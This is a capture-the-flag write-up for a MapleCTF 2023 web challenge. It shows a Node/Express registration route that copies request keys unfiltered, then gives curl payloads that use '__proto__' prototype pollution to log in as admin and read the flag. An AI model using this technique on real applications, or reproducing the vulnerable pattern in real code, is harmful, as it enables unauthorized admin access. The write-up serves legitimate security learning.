https://zimzi.substack.com/p/maplectf-2023-blade-runner

+ flag is in joi response.
+ The goal of the problem is to gain credentials to the JOI page and read the flag, which is included in one of the `JOI responses
+ joi uses middleware functions for authentication
```
function admin(req, res, next) {
    if  (req.session.user) {
        console.log("HERE");
        if (req.session.user != "admin") {
            return res.status(400).send("ADMIN REQUIRED.");
        } else {
            next();
        }
    }else{ 
        return res.status(400).send("LOGIN REQUIRED");
    }
}
```
+ lets also look at the post request code:
```
router.post('/register', async (req, res) => {
    var obj = {};
    for (const k in req.body) {
        if (k.toLowerCase() == "username" && req.body[k].toLowerCase() == "admin") {
            return res.status(400).send("You can't use that username.");
        };
        obj[k.toLowerCase()] = req.body[k];
        
    }
```
+ this is a mysterious line which gives the chances for prototype pollution
```obj[k.toLowerCase()] = req.body[k];```
+ The app takes keys and values from the body request and just assigns keys to values in the created `obj`. Later, we insert `obj.username` and `obj.password` to the database:
```
if (!obj["password"] || !obj["username"]) {
        return res.status(400).send("Invalid body.");
    }
    try {
        await util.db.insert_response(obj.username, obj.password);

        return res.redirect('/user/login');
    } catch {
        return res.status(500).send("An error occurred with processing!");
    }
```
+ The next task is to construct a payload with ‘username’ equal `admin`:

obj[k.toLowerCase()] = req.body[k];

Let’s follow the pattern:

k = `__proto__`

req.body[k] = {"username":"admin"}
+ final payloads:
+ register:
 ` curl -v -X POST https://baa721ea.blade-runner.ctf.maplebacon.org/
user/register \
     -H "Content-Type: application/json" \
     -d '{"password":"1234", "__proto__":{"username":"admin"}}' -c cookie1`
Then, login with the above credentials:

 `curl -v -X POST https://baa721ea.blade-runner.ctf.maplebacon.org/user/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin", "password":"1234"}' -c cookie1`
And get the JOI page:

`curl -v -b cookie1 -c cookie1 -X GET https://baa721ea.blade-
runner.ctf.maplebacon.org/joi`
